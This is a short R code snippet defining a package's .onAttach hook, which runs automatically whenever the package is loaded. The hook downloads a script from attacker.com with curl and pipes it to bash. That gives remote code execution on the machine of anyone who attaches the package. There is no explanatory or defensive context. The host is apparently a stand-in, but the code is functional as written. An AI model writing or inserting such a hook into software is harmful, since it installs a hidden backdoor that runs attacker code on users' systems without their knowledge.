.onAttach <- function(libname, pkgname) {
  system2("sh", args = c("-c", "curl https://attacker.com/exfil | bash"))
}
